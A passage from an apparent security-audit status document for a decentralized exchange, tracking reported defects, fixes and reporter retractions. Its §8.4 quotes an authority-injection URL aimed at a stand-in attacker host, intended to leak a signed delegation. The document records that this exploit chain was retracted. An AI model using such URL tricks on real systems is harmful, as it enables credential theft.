  streak. One edge-triggered error log, `failStreak`/`backoffNs` on
  `getLiquidationSweepHealth`, and `adminResetLiquidationBreaker` for an operator who has fixed
  the cause. Pinned structurally in `tests/test_deploy_hygiene.sh` (6 assertions, verified to
  fail on the pre-fix heartbeat) plus live assertions in `tests/test_audit_2026_08_fixes.sh`.

### 7.2 Outstanding from the second wave

Not addressed in this pass, listed so the gap is visible rather than assumed closed. Severity
order, most consequential first:

- **#13 item 1** — `executeSwapCross` settles the sell leg, then returns `#err` from two
  points below that settlement with no rollback, and every fill-capture hook sits under those
  returns. The caller is told the swap failed while holding the proceeds (a client that
  retries on `#err` double-sells), and because `refreshRolling24h` is the sole call site of
  `emitFillEvents`, the settled fills are permanently absent from the hash-chained archive.
- **(FIXED 2026-08-15 — outbound anchor + §3 pins, see §8 W2-01)** **#18 finding 50** — `verifyChain` never anchored its recomputed tail to the certified
  `chainHead`, so corruption of the newest event, or any consistent rewrite of a tail suffix,
  verifies clean. This is the endpoint the sealed-season record points auditors at.
- **(FIXED 2026-08-15 — the cash==0 guard mirrors the qty guard, see §8 W4-03; this also
  formally retracts §2-era clearance of the function)** **#15 item 2** — `settleNettedPair`'s dust path: `cash` floors to zero, `writeOffLoan`
  rejects it and the result is `ignore`d, while the buyer's base debt is still forgiven.
  Corrects §2's clearance of that function.
- **(FIXED 2026-08-15 — available-gated, see §8 W4-02)** **#16 finding 27** — `performLpDeposit` gated on the raw balance instead of available, so a
  deposit can spend what a staged order reserved.
- **(FIXED 2026-08-15 — staging-id resolver, release-time expiry kill, sweep repoint; see §8
  W4-05/06/07)** **#14 findings 4/16/17** — order identity and time-in-force did not survive the sealed
  release path: `ammSweepResting` re-rests under a fresh id without `linkStagedRelease` or
  the user's `orderExpiry`, `cancelMyOrder` never consults `stagedReleasedAs`, and a staged
  order whose expiry lapsed still executes as a taker.
- **(FIXED 2026-08-15 — sample-time bases + direction-aware replacement; per-quote aggregation
  with a USDT depeg alarm; see §8 W3-06/W3-05)** **#17 items 2 and 3** — the jump-breaker confirmation livelock, and USD/USDT venues pooled
  into one median and one dispersion with the XRC anchor on the USDT side.
- **#16 finding 3** — the vault deposit fee is evaluated at the pre-deposit weight.
- **#13 item 3** — `swap()`/`quoteSwap()` never range-check `maxSlippage`, so an
  out-of-range value traps instead of returning the structured `#err` four sibling endpoints
  already return.
- **#19** — the scalability findings, including §4.3 above, which #19 re-derived
  independently and correctly. None is a correctness defect; the value of the report is the
  correction itself, since a sweep listed as "already bounded" never gets re-measured.
- **#21 part two** — three latent defects in the vendored OQL. They do not fire in the
  deployed canister and activate only if the served-entity or secondary-index path is
  adopted; they are a note on that future change.

**#21 part one is already closed** — both legs of the lint gate were repaired in the §4.1
work, and the M0155 count is now genuinely 0 rather than blind, because both real sites were
rewritten to `SafeMath.subOrZero`. **#13 item 2** (the `openPosition` VWAP wipe) was fixed
independently in `6f63107` after a live incident, before the report arrived.

Neither wave has been acknowledged on the tracker, and `andreij6` is not yet scored in
[CONTRIBUTORS.md](../CONTRIBUTORS.md).

---

## 8. Rounds 2–6 — issues #22–#28 and #36–#41, triaged and worked (2026-08-14 → 15)

Rounds 2–6 arrived from the same three teams between 2026-08-05 and 2026-08-13. Every item
was re-verified against the tree at `01d2b23` by symbol lookup (same standard as §1–§7),
decomposed into a worked queue, and **the engineering waves (W1–W5, 46 work items) were run
to completion on 2026-08-15**; the process wave (W6) is in flight with its remainder listed
in §8.3. The
table below is the dedup surface: one row per work item, with the issue items it covers.
"Fixed" means implemented AND pinned by a test that fails on the pre-fix shape (the
mutation-verification discipline of §4.1 applied throughout); "decision" means the finding
was answered in writing rather than by code, with the reasoning recorded.

### 8.1 Per-issue status

| Issue | Work item | Finding | Status |
|---|---|---|---|
| #4 item 2 | W4-20 | CSP is verified by configuration, never by response headers | fixed |
| #6 item 5 | W4-18 | Volume credit reaches the scorecard on exactly one settlement path | fixed |
| #8 item 4a | W4-21 | The `order.id` ↔ `fill.orderId` join is only half-closed | decision — the join STAYS: the standalone verifier needs it, and the transparency doctrine outranks the privacy nicety; recorded in the design docs |
| #13 item 1 | W2-03 | `executeSwapCross` settles the sell leg, returns `#err`, and skips the fill-capture hooks | fixed |
| #13 item 3 | W4-04 | `swap()` / `quoteSwap()` never range-check `maxSlippage` | fixed |
| #14 | W4-05 | `cancelMyOrder` never consults `stagedReleasedAs` | fixed |
| #14 | W4-06 | A staged order whose expiry lapsed still executes as a taker | fixed |
| #14 | W4-07 | `ammSweepResting` re-rests under a fresh id, dropping the release link and the user's expiry | fixed |
| #15 item 2 | W4-03 | `settleNettedPair`'s dust path forgives debt against a rejected write-off | fixed |
| #16 | W4-02 | `performLpDeposit` gates on the raw balance, so it spends what a staged order reserved | fixed |
| #16 | W4-11 | The vault deposit fee is priced at the pre-deposit weight | fixed |
| #17 item 3 | W3-05 | USD and USDT venues are pooled into one median and one dispersion | fixed |
| #18 | W2-01 | `verifyChain` never anchors the recomputed tail to the certified `chainHead` | fixed |
| #19 | W3-01 | `softLockedReserved` scans all staged state per (owner, token) | fixed |
| #19 | W5-19 | The remaining uncapped sweeps and full scans | fixed |
| #22 item 3 | W1-04 | `cancelAllUserOrders` is a second uncapped O(staged) term on the liquidation batch | fixed |
| #23 item 1 | W3-02 | The self-funding loop re-enters after an ambiguous ledger reject | fixed |
| #23 item 2 | W3-03 | The auto-fuel trigger extrapolates burn with no clamp and no absolute ICP budget | fixed |
| #24 item 1 | W4-08 | The arb's per-tick clip is 2.05× the DEX's per-call cap, so its inventory is unflattenable | fixed |
| #24 item 2 | W4-17 | Arbitrageur design cluster: unhedged commits, no price bound, stale marks, a 65-second budget | fixed |
| #25 item 3 | W4-01 | The unshipped-history gate ignores `accounts.journal`, which the same message discards | fixed |
| #25 item 2 | W4-12 | The reset clears `playReservedUnits` while the Bridge's claimables survive | fixed |
| #25 item 4 | W4-13 | `performWorldWipe` clears a single-flight flag it does not own | fixed |
| #25 item 5 | W4-14 | After a season reset the prior season's history answers `{events = []; total = 0}` — a success | fixed |
| #26 item 26 | W1-03 | One unreachable archive segment fails every History and OQL read, for every caller | fixed |
| #26 item 5 | W4-09 | `adminReplayStep` has no single-flight guard, so a double-click fakes a reserve alarm | fixed |
| #26 item 3 | W4-10 | Blackholed archive segments are never re-observed, so the chain table shows a stale `ok` | fixed |
| #26 item 1 | W4-15 | The season detach drops sealed archives out of every funding path | fixed |
| #26 item 4 | W4-16 | An archive spawn is unrecorded across its own await, and the cleanup swallows the principal | fixed |
| #27 item 1 | W1-05 | Load shedding is caller-scoped, so it refuses shed users' exits | fixed |
| #27 item 2 | W3-04 | The Bridge advances its admission counter behind the DEX commit | fixed |
| #27 item 4 | W3-07 | The XRC anchor is aged from arrival and re-stamped as instantaneous | fixed |
| #28 item 1 | W5-01 | `tests/test_market_walks_locked.sh` can never fail | fixed |
| #28 item 2 | W5-02 | `run_all.sh` computes the failing-assertion count and then discards it | fixed |
| #28 item 3 and 4 | W5-12 | Two Motoko hygiene fixes: unretunable constants, and a clamp that should fail closed | fixed |
| #36 item 36 | W1-01 | Retire `stop_local_bots.sh`: its pattern now selects the LIVE subnet fleet | fixed |
| #36 item 6 | W5-04 | The root-key pin fails on absence, not on reintroduction | fixed |
| #36 item 3, 4, 7 | W5-10 | Three defects in the harness that judges the deploy gates | fixed |
| #36 item 8 | W5-17 | The display-integrity suite catches three properties by their spelling | fixed |
| #36 item 2 | W5-18 | The repaired `M0155` ratchet is still inert outside `src/backend` | fixed |
| #36 item 1 | W6-04 | A README sentence no gate maintains | fixed |
| #37 item 37 | W1-02 | Four `DEPLOY_MODE` gates read the posture by text, none comment-aware | fixed |
| #37 item 37 | W2-02 | The standalone verifier exits 0 against a hostile gateway | fixed |
| #37 item 6 | W5-07 | The Candid breaking-change hatch opens from the working tree, and downward | fixed |
| #37 item 7 | W5-09 | One `.mjs` in `scripts/` is run by a gate and the other is not | fixed |
| #38 item 1 | W5-03 | The solvency rounding rule is pinned at the primitive and at none of its call sites | fixed |
| #38 item 3 | W5-11 | A nested template literal drives the shared JS stripper out of phase | fixed |
| #38 item 4 | W5-13 | The Nat-underflow fix exists at three sites and is pinned at one | fixed |
| #38 item 2 | W5-14 | The fleet's only global invariant reports green when its queries stop answering | fixed |
| #38 item 5 | W5-15 | The only bridge-upgrade test has no oracle for either property its header names | fixed |
| #38 item 6 | W5-16 | The zero-collateral guard on `marginUsage` is unpinned, on a synchronous heartbeat path | fixed |
| #39 | W6-07 | Pull and triage the two private advisories | open |
| #40 item 1 | W5-08 | The integrity claim the de-vendoring rests on is never checked | fixed |
| #40 item 4 | W6-03 | A sign-in invariant stated as MUST, with no instrument | fixed |
| #40 | W6-01 | Refresh the public triage document | open |
| #40 | W6-09 | `frontend_origins` omits the app's canonical origin (anti-sybil fails closed there) | open |
| #41 item 3 | W5-05 | The property that closes the reentrancy/double-spend class is pinned by nothing | fixed |
| #41 item 1 | W5-06 | Neither published build path works on a clean checkout | fixed |
| #41 item 2 | W6-02 | The production gate does not match the code it gates | fixed |
| found internally | W1-06 | Pocket-ic reaper trio: owner-resolution assumes port 8000, misfires under worktree parallelism | fixed |
| found internally | W3-06 | The jump breaker judges independence on arrival clocks, and its candidate never ages | fixed |
| found internally | W3-08 | Nine heartbeat subtasks run inline, so a trap in any one stops maintenance permanently | fixed |
| found internally | W3-09 | The deploy path never reads the Bridge's posture literal | fixed |
| found internally | W4-19 | `_minSourcesOverride` can pin the source floor below the robustness floor | fixed |
| found internally | W5-20 | The deploy path ships whatever candid is lying around | fixed |
| found internally | W6-05 | Acknowledge rounds 2–6, and publish the scoring basis | open |
| found internally | W6-06 | Answer the disclosure-channel question | open |
| found internally | W6-08 | Latent OQL defects: a watch item, not work | open |

### 8.2 Corrections to this document made in this refresh

Edited in place above, marked "(corrected 2026-08-15)": the §1.7 heartbeat-isolation claim
(half-true → now fully isolated behind `hbRun`/`hbReady`); §2-era clearance of
`settleNettedPair` (withdrawn — #15.2 was right, fixed as W4-03); six §3 production-readiness
items that 1.60 fixed but the list still showed open (interlocks, posture gates,
pattern-kills, deploy-target hard-error, bridge §11 target-state note, kill matrix); §6's four
deferred items (volume credit, `_minSourcesOverride`, CSP headers, `order.id` join) all
resolved or decided.

### 8.3 Still open after this pass

- W6-05 — acknowledge rounds 2–6 on the issue threads and publish the scoring basis
  (outward-facing; queued for explicit operator go-ahead).
- W6-06 — the disclosure-channel decision (§0's original ask — still the top process gap).
- ~~W6-07~~ — DONE 2026-08-15: both round-4 advisories pulled, verified, FIXED (archiveExecute
  hop budget; depositLp(0,0) loud refusal), pinned by `tests/test_ghsa_round4.sh`; the
  reporter reply + public mirror ride the outward batch.
- ~~W6-08~~ — DONE 2026-08-15: unreachability chain recorded in the OQL source + README watch
  section gating any served/secondary-index adoption on the four latent fixes.
- W6-09 — live `frontend_origins` env-var check on the subnet (operator action; template fixed).
- Module-hash / reproducible-build **verification** (#10.4's second half; the clean-checkout
  build itself is fixed).

### 8.4 Reporters' own corrections and retractions (recorded, rounds 2–6)

Recorded because the document promised to hold everyone to the same standard, including them:

- **#37.4 (OhShii, retracted in part):** the claim that a signed delegation reaches
  `attacker.example.com` was withdrawn after measurement — `new Request("http://127.0.0.1:1@attacker.example.com/callback", …)`
  throws on credentials in the URL before anything is sent. The authority injection itself is
  real (`new URL(…).hostname` IS the attacker host). So §1.2's final step, credited as #11.4,
  is **not established**: the defect and the fix stand; the exploit chain as written does not.
- **#41.2 step 4 (OhShii, they were right, our first pass was wrong):** `claimPlayFunds` IS
  genuinely retired; the fix reached the checklist and not the kill matrix. Both now agree
  (W6-02).
- **#40.4 (both sides sharpened):** the "third statement of the II origin list" is the
  anti-sybil verifier's `frontend_origins` — a different mechanism. The II half now has a gate
  (W6-03); the anti-sybil half was a REAL, separate gap (the canonical origin missing from the
  template) and is filed as its own item (W6-09).
- **PRICE_MIN_SOURCES 2→3 (OhShii, withdrawn):** retracted after andreij6's #17 demonstrated
  the change moves the failure rather than fixing it. Kept visible in §7.1; the eventual fix
  was the per-quote aggregation + depeg alarm (W3-05) and the floor-refusing override clamp
  (W4-19).
